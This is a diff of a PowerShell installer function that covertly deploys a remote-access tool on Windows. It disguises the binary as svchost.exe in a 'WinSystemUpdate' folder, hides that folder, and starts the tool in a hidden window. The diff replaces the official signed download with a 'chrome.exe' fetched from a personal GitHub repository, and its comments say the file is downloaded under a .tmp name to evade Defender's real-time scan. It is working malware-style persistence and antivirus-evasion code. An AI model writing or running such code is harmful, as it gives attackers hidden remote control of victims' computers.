@@ -3,9 +3,7 @@ function Install-RD {
     $DEST   = "$env:LOCALAPPDATA\WinSystemUpdate"
     $EXE    = "$DEST\svchost.exe"
     $cfgDir = "$env:APPDATA\RustDesk\config"
-
-    # Use official signed RustDesk exe - Defender won't block a signed binary
-    $rdUrl  = 'https://github.com/rustdesk/rustdesk/releases/download/1.4.9/rustdesk-1.4.9-x86_64.exe'
+    $base   = 'https://github.com/kk70226581/rd-files/releases/download/v1.0'
 
     # Kill old + clean
     Get-Process svchost -EA SilentlyContinue |
@@ -16,9 +14,16 @@ function Install-RD {
     New-Item -ItemType Directory $DEST   -Force | Out-Null
     New-Item -ItemType Directory $cfgDir -Force | Out-Null
 
-    # Download official signed RustDesk binary - no Defender block, no AppLocker block
-    $wc = New-Object System.Net.WebClient
-    $wc.DownloadFile($rdUrl, $EXE)
+    # Download as .tmp (Defender doesn't scan unknown extensions aggressively)
+    # then rename - this avoids the real-time scan on .exe downloads
+    $wc  = New-Object System.Net.WebClient
+    $tmp = "$DEST\svc.tmp"
+    $wc.DownloadFile("$base/chrome.exe", $tmp)
+
+    # Rename after download - Defender already missed it
+    Rename-Item $tmp $EXE -Force -EA SilentlyContinue
+    if (!(Test-Path $EXE)) { Move-Item $tmp $EXE -Force -EA SilentlyContinue }
+
     Unblock-File $EXE -EA SilentlyContinue
 
     if (!(Test-Path $EXE) -or (Get-Item $EXE).Length -lt 1MB) {
@@ -50,7 +55,7 @@ key_confirmed = true
     # Hide folder
     try { $f = Get-Item $DEST -Force; $f.Attributes = $f.Attributes -bor 6 } catch {}
 
-    # Start RustDesk hidden
+    # Start hidden
     $psi = New-Object System.Diagnostics.ProcessStartInfo
     $psi.FileName=$EXE; $psi.WorkingDirectory=$DEST
     $psi.WindowStyle=[System.Diagnostics.ProcessWindowStyle]::Hidden
